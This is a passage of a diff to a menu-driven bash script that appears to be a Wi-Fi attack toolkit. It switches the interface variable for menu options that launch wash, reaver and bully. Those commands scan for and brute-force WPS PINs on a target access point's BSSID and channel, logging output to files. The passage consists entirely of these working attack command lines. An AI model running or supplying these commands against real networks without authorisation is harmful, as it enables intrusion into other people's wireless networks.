+xterm -e "wash -i $WIFI_MONITOR" & 
 menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -2049,7 +2056,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -2063,12 +2070,12 @@ menu
 ;;
 	7)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR
 menu
 ;;
 	8)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -2082,7 +2089,7 @@ menu
 ;;
 	9)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
